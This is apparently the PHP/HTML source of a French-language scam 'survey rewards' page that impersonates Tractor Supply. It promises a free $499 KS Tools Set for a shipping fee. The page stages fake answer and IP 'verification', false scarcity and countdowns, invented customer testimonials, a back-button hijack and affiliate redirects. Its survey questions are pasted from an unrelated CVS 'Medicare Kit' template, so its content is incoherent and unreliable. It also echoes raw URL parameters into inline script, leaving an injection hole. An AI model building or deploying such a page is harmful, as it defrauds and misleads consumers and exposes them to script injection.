<!DOCTYPE html>

<?php
// w4 logo

$page_peel_brand = "";
  if ($_GET['s'] == "1016") {
$page_peel_brand = <<<page_peel_brand
<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
<style>
img.banner {
    position: fixed;
    top: 0;
    width: 150px;
    z-index: 999999999999;
}
</style>
page_peel_brand;
  }
// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
session_start();
require_once dirname(__FILE__) . "/../wall/nas-functions.php";
if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
  $tag = $_GET['nasTag'];
} else {
  $tag = "";
}

$data = GetNasWall("1", null, $tag)[0];

require_once(dirname(__FILE__) . "/../helpers.php");
if (getcwd() === "/var/surveys/redzun") {
    include("_php_voluum_clock_or_lptoken_check-w14.php");
} else {
    include(dirname(__FILE__) . "/../_php_voluum_clock_or_lptoken_check-w14.php");
}

if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
  else $country = 'us';

$_SESSION['cc'] = $country; // Set Country ID

if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
  else $wid = 'default';

$_SESSION['wid'] = $_GET['wid']; // Set Wall ID

$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;

?>
<script>
  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
  pr_name = "<?php echo str_rot13(""); ?>";


</script>

<script>
 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
			
			var jumpurl;
      jumpurl = '<?php echo $data->url ?>';
 </script>

<html lang="fr">
    <head>
        <base href="/new-folder/">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Récompenses de sondage</title>
        <link rel="stylesheet" href="./files/style.css?v=14">
        <link rel="stylesheet" href="./files/animate.min.css">
        <link rel="icon" href="./files/tra_fav.png">
        <script defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
        <script src="./files/datehead.js"></script>

        <style>
            .con-body button{
                font-size: 18px;
                font-weight: 600;
                background-color: #E31937;
                color: #fff;
                text-align: center;
                padding: .6rem;
                margin-bottom: .5rem;
                width: 80%;
                border: 1px solid #E31937;
                border-radius: 3px;
                cursor: pointer;
                transition: transform .5s;
            }

            .con-body button:hover{
                background-color: #E31937;
            }

            .con-head-ln1 {
                background-color: #E31937;
                color: #fff;
            }

            .con-body {
                margin: 10px;
                /* background-image: url('./banner.jpg');
                    background-size: cover; */
                background-color: #fff;
                padding: 15px;
                border-bottom: 10px solid #E31937;
                border-radius: 3px;
                box-shadow: 0px 0px 2px 2px #d1d1d1;
            }

            .inn-q-verif-content-title b {
                color: #E31937 !important;
            }

            .con-body-ln3 b {
                color: #E31937;
            }

            .con-prize .prize-ln2-title {
                color: #222;
                padding-left: 15px !important;
            }

            .con-prize .con-prize-button {
                font-size: 18px;
                font-weight: 600;
                background-color: #E31937;
                color: #fff;
                text-align: center;
                padding: 0.6rem;
                margin: 10px -10px 0px 10px;
                width: 80%;
                border: 1px solid #E31937;
                border-radius: 3px;
                cursor: pointer;
                transition: transform 0.5s;
            }

            .con-prize .con-prize-button:hover {
                background-color: #E31937;
                cursor: pointer;
                transform: scale(1.1);
            }

            .comm-title button {
                font-size: 15px;
                padding: 7px 15px;
                margin-left: 5px;
                border: 0px;
                background-color: #E31937;
                color: #fff;
                border-radius: 3px;
                cursor: pointer;
            }

            .con-footer {
                margin: 10px;
                background-color: #fff;
                padding: 15px;
                border-top: 10px solid #222;
                border-radius: 3px;
                box-shadow: 0px 0px 2px 2px #d1d1d1;
            }

            .con-bottom-bar {
                text-align: center !important;
                background-color: #222;
                position: fixed;
                bottom: 0;
                left: 0;
                z-index: 99;
                width: 100%;
                border-top: 2px solid #222;
                padding-top: 3px;
                padding-bottom: 3px;
                box-shadow: 11px 0px 24px 0 rgba(0, 0, 0, 0.3);
            }

            .modal-foot button {
                font-size: 20px;
                padding: 0.5rem 1rem;
                font-weight: 600;
                background-color: #E31937;
                color: #fff;
                border: 1px solid #fff;
                border-radius: 3px;
                cursor: pointer;
            }

            .modal-foot {
                background-color: #222;
            }

            .con-head-ln2 {
                background-color: #fff;
                color: #000;
                text-align: center;
            }

            body {
                padding: 0px;
                margin: 0px;
                background-color: #e2e2e2;
                font-family: sans-serif;
                font-size: 14px;
                background-image: url('./files/tra_bg.png');
                background-attachment: fixed;
                background-position: center;
                background-repeat: repeat-y;
                background-size: cover;
            }

            .btn-close {
                background-color: #fff;
            }
        </style>
    </head>
    <body>
        <div class="con-full">
            <div class="con-head">
                <div class="con-head-ln1">
                    <h4></h4>
                </div>
                <div class="con-head-ln2">
                    <div class="con-head-line">
                        <hr/>
                        <span>Sondage sur</span> 
                        <hr/>
                    </div>
                    <img src="./files/tra_logo.png" style="max-width: 200px; height: auto; margin-top: 10px;" alt="">
                    <h3><script>document.write(datehax("January, February, March, April, May, June, July, August, September, October, November, December", "fr"));</script><img class="imgflg" src="./files/flaglogo.png" alt=""></h3>
                </div>
            </div>
            <div class="con-body-pad">
                <div class="con-body" id="content-changeCol">
                    <div class="con-body-ln1">
                        <div class="con-body-ln1-inn1">
                            <img src="./files/P_1-removebg-preview.png" id="product-img" alt="">
                        </div>
                        <div class="con-body-ln1-inn2">
                            <p>
                                <b></b><br/><br/>Nous aimerions vous offrir une opportunité unique de recevoir un tout nouveau <b>KS Tools Set!</b>
                                Pour réclamer, répondez simplement à ce court sondage sur votre expérience avec Tractor Supply.
                            </p>
                            <br/>
                            <p>
                                <b><span>Attention !</span></span> Cette offre de sondage expire aujourd&#x27;hui, <script>document.write(datehax("January, February, March, April, May, June, July, August, September, October, November, December", "fr"));</script>.</b>
                            </p>
                        </div>
                    </div>
                    <div class="con-body-question">
                        <div class="con-body-ln2">
                            <div class="inn-question">
                                <button class="inn-q-select" id="animate_btn_0" value="1">DÉMARRER LE SONDAGE</button>
                            </div>
                        </div>
                        <div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 1 sur 8</small><br/>
        <b class="qeus-text">How often do you visit CVS for your shopping needs?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Multiple times a week</button>
        <button class="inn-q-select qeus-text">Once a week</button>
        <button class="inn-q-select qeus-text">A few times a month</button>
        <button class="inn-q-select qeus-text">Rarely or never</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 2 sur 8</small><br/>
        <b class="qeus-text">What primarily drives your choice to shop at CVS?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Convenience of location</button>
        <button class="inn-q-select qeus-text">Product selection</button>
        <button class="inn-q-select qeus-text">Prices and deals</button>
        <button class="inn-q-select qeus-text">Loyalty rewards program</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 3 sur 8</small><br/>
        <b class="qeus-text">When seeing ads from CVS, how do you typically respond?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">I look for items I need</button>
        <button class="inn-q-select qeus-text">I browse if there&#x27;s a good deal</button>
        <button class="inn-q-select qeus-text">I consider visiting if there&#x27;s a promo</button>
        <button class="inn-q-select qeus-text">I usually ignore the ads</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 4 sur 8</small><br/>
        <b class="qeus-text">If you won a Medicare Kit from CVS, how would it change your view of the CVS?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Significantly more positive</button>
        <button class="inn-q-select qeus-text">Somewhat more positive</button>
        <button class="inn-q-select qeus-text">No change</button>
        <button class="inn-q-select qeus-text">More negative</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 5 sur 8</small><br/>
        <b class="qeus-text">Regarding the Medicare Kit, which feature is most appealing to you?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Durability</button>
        <button class="inn-q-select qeus-text">Cooling efficiency</button>
        <button class="inn-q-select qeus-text">Portability</button>
        <button class="inn-q-select qeus-text">Design and appearance</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 6 sur 8</small><br/>
        <b class="qeus-text">How likely are you to use a Medicare Kit if you received one from CVS?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Very likely</button>
        <button class="inn-q-select qeus-text">Somewhat likely</button>
        <button class="inn-q-select qeus-text">Unlikely</button>
        <button class="inn-q-select qeus-text">I would not use it</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 7 sur 8</small><br/>
        <b class="qeus-text">In terms of health and wellness products, how well do you think CVS meets your needs?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Exceeds my needs</button>
        <button class="inn-q-select qeus-text">Meets my needs well</button>
        <button class="inn-q-select qeus-text">Adequately meets my needs</button>
        <button class="inn-q-select qeus-text">Does not meet my needs</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Tractor Supply Shopper Experience Survey</span><br/><br/>
        <small class="qeus-numb">Question 8 sur 8</small><br/>
        <b class="qeus-text">How likely are you to participate in future promotions or surveys from CVS?</b>
    </h2>
    <div class="inn-question" id="inn-last-q-item">
        <button class="inn-q-select qeus-text">Very likely</button>
        <button class="inn-q-select qeus-text">Somewhat likely</button>
        <button class="inn-q-select qeus-text">Not very likely</button>
        <button class="inn-q-select qeus-text">Not at all likely</button>
    </div>
</div>

                        <div class="inn-q-verif-content hidden" id="verif-content">
                            <h2 class="inn-q-verif-content-title"><b>Veuillez patienter pendant que nous traitons vos réponses...</b></h2>
                            <h2 id="inn-q-progress-state1">Soumission des réponses...</h2>
                            <h2 id="inn-q-progress-state2" class="hidden">Vérification des adresses IP en double...</h2>
                            <h2 id="inn-q-progress-state3" class="hidden">Vérification de notre inventaire de produits...</h2>
                            <h2 id="inn-q-progress-state4" class="hidden">Félicitations...</h2>
                            <img id="inn-q-progress-loading" src="./files/loadingBL.gif" alt="">
                            <h2 id="inn-q-progress-dones2" class="hidden">Réponses soumises</h2>
                            <h2 id="inn-q-progress-dones3" class="hidden">Adresse IP vérifiée</h2>
                            <h2 id="inn-q-progress-dones4" class="hidden">Produits disponibles en stock</h2>
                        </div>


                        <div class="con-body-ln3 hidden" id="prize-content-1">
                            <h2><b>Merci d&#x27;avoir répondu au sondage!</b></h2>
                            <p>Parce que vous avez aidé à fournir des données de consommation extrêmement précieuses, vous pouvez maintenant choisir certaines des récompenses exclusives suivantes ci-dessous.</p>
                            <p>Veuillez noter que si vous quittez cette page sans réclamer votre récompense, nous n&#x27;avons d&#x27;autre choix que de donner à un autre visiteur la possibilité de participer à notre programme de récompenses.</p>
                            <div class="body-ln3-carret animate__animated animate__slower animate__infinite animate__shakeY"><b><i class="fas fa-angle-double-down fa-2x"></i></b></i></div>
                        </div>
                    </div>
                </div>

                <div id="prize-content-2" class="hidden">
                    <div class="con-prize">
                        <div class="con-prize-outter">
                            <div class="con-prize-ln1">
                                <img src="./files/P_1-removebg-preview.png" alt="">
                            </div>
                            <div class="con-prize-ln2">
                                <h2 class="prize-ln2-title" id="prize-ln2-desc">
                                    KS Tools Set
                                </h2>
                                <p class="prize-ln2-desc">
                                    asd           
                                </p>
                                <div class="prize-ln2-amount">
                                    <div class="prize-ln2-zero1">&nbsp;Prix: <del>$499.99</del></div>
                                    <div class="prize-ln2-zero2 animate__animated animate__heartBeat animate__slower animate__infinite">$0.00</div>
                                </div>
                                <p class="prize-ln2-stock">&nbsp;Restant en stock: <b>(<span class="animate__animated animate__flash animate__slower animate__infinite"> 2 </span>)</b></p>
                                <p class="prize-ln2-pfs">&nbsp;Ne payez que les frais de port!</p>
                                <div class="prize-ln2-btn">
                                    <button id="btn-claim" class="con-prize-button"><i class="fas fa-shopping-cart"></i> RÉCLAMER LA RÉCOMPENSE</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="con-nothing" id="nothing-id"></div>
            
                <!-- ALL COMMENTS ARE LISTE HERE -->
                <div id="comments" class="con-comment hidden">
                    <div class="com_cont">

                        <div class="comm-div">
                            <div class="comm-desc">
                                <div class="comm-name">Nouveau commentaire</div>
                                <div class="comm-box">
                                   <textarea name="comment_box" rows="5"></textarea>
                                </div>
                                <div class="comm-title">
                                    <span><i class="fas fa-comments"></i> Commentaires (5)</span>
                                    <span><button><i class="fas fa-camera"></i></button><button>Soumettre</button></span>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/1.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Jade Martin</div>
                                <div class="comm-text">
                                    Je viens de recevoir ça par e-mail et j&#x27;ai essayé. Excité de recevoir ma récompense! Puis-je également envoyer le sondage à mes amis?
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div>
                                        <div><i class="fas fa-thumbs-up"></i><span>52</span></div>
                                    </div>
                                    <div>
                                        <a href="#">J&#x27;aime</a>
                                        <a href="#">Répondre</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/2.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Gabriel Bernard</div>
                                <div class="comm-text">
                                    J&#x27;ai réellement reçu un prix de ce sondage! J&#x27;étais sceptique au début, mais j&#x27;ai essayé. Et regardez ce qui vient d&#x27;arriver par la poste!<br/>
                                    <img src="./files/download.png" alt="">
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>84</span></div>
                                    </div>
                                    <div>
                                        <a href="#">J&#x27;aime</a>
                                        <a href="#">Répondre</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/3.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Ambre Moreau</div>
                                <div class="comm-text">
                                    Lol, un sondage tellement cool, mais dommage que je n&#x27;aie reçu aucun prix..
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>12</span></div>
                                    </div>
                                    <div>
                                        <a href="#">J&#x27;aime</a>
                                        <a href="#">Répondre</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/4.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Léo Robert</div>
                                <div class="comm-text">
                                    Je ne participe généralement pas à ce genre de sondages en ligne, mais celui-ci est vraiment bon!! Nous utiliserons ce prix à bon escient, merci beaucoup!!<br/>
                                    <img src="./files/P_1.webp" alt="">
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>97</span></div>
                                    </div>
                                    <div>
                                        <a href="#">J&#x27;aime</a>
                                        <a href="#">Répondre</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/5.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Emma Richard</div>
                                <div class="comm-text">
                                    Où puis-je faire plus de sondages comme ceux-ci? J&#x27;aime recevoir des prix :)
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>16</span></div>
                                    </div>
                                    <div>
                                        <a href="#">J&#x27;aime</a>
                                        <a href="#">Répondre</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="con-footer" id="con-footer">
                    <div class="footer-content">
                        <br /><br />
                        <img src="./files/f_guarantee.png" alt="guarantee" height="70px" width="auto" /> <img src="./files/f_secure_1.png"
                            alt="secureSiteLogo" height="75px" width="auto" />
                        <p class="copyright">Copyright © <script>document.write(datenhay());</script></p>
                        <div class="claim">
                            <span></span><br/><br/>
                            *Les produits proposés sur la dernière page nécessitent des frais d&#x27;expédition et de manutention. Consultez le site du fabricant pour plus de détails, car les conditions varient selon les offres. Consultez les conditions générales importantes concernant ce sondage, ce site Web et cette publicité.
                            <br/>*Important: des frais d&#x27;expédition peuvent s&#x27;appliquer.<br>
                            <br/><br/><br/>
                        </div>
                    </div>
                </div>

            </div>
        </div>

        <div class="con-bottom-bar">
           <div class="offer_expires">L&#x27;offre expire dans <span id="time"></span></div>     
        </div>

        <div class="mod-con mod-con-bg hidden" id="modal-prize">
            <div class="modal mod-con-inn">
                <div class="btn-close">
                    <img src="./files/tra_logo.png" height="50px" alt="">
                    <!-- <h2>Tractor Supply</h2> -->
                    <button id="btn-close" ><!-- <i  class="fas fa-times fa-lg"></i> --></button>
                </div>
                <hr>
                <div class="modal-head">
                    <p><span>Félicitations!</span> Nous avons réservé (1) KS Tools Set exclusivement pour vous.</p>
                </div>
                <div class="modal-body">
                    <p><span>Comment réclamer votre KS Tools Set:</p>
                    <ol>
                        <li>Remplissez votre adresse de livraison.</li>
                        <li>Payez uniquement les frais d&#x27;expédition pour recevoir votre prix.</li>
                        <li>Votre prix sera livré dans les 5 à 7 jours ouvrables.</li>
                    </ol>
                </div>
                <div class="modal-foot">
                    <img src="<?php echo $data->impression_url ?>" style="display:none;"></img>
                    <button id="button1">Continuer</button>
                </div>
            </div>
        </div>
    </body>
    <script src="./files/script.js?v=29"></script>

    <script>
        document.getElementById('button1').addEventListener("click",function(){
            var urlParams = new URLSearchParams(window.location.search);
            
            window.location.href = jumpurl ;
        },false);
    </script>

    <?php
            if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
            {
                $aff_id = "2";
                if (!empty($_GET["s"])) {
                    $aff_id = $_GET["s"];
                }
                
                $trk_urls = [
                    "https://" . $_GET["trk"] . "/click/20"
                ];
                
                echo getPushCode("us", $aff_id, $trk_urls);
            }
            ?>
            
            <?php
            $backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
            
            echo getBackButton($backbutton_url);
    ?>
</html>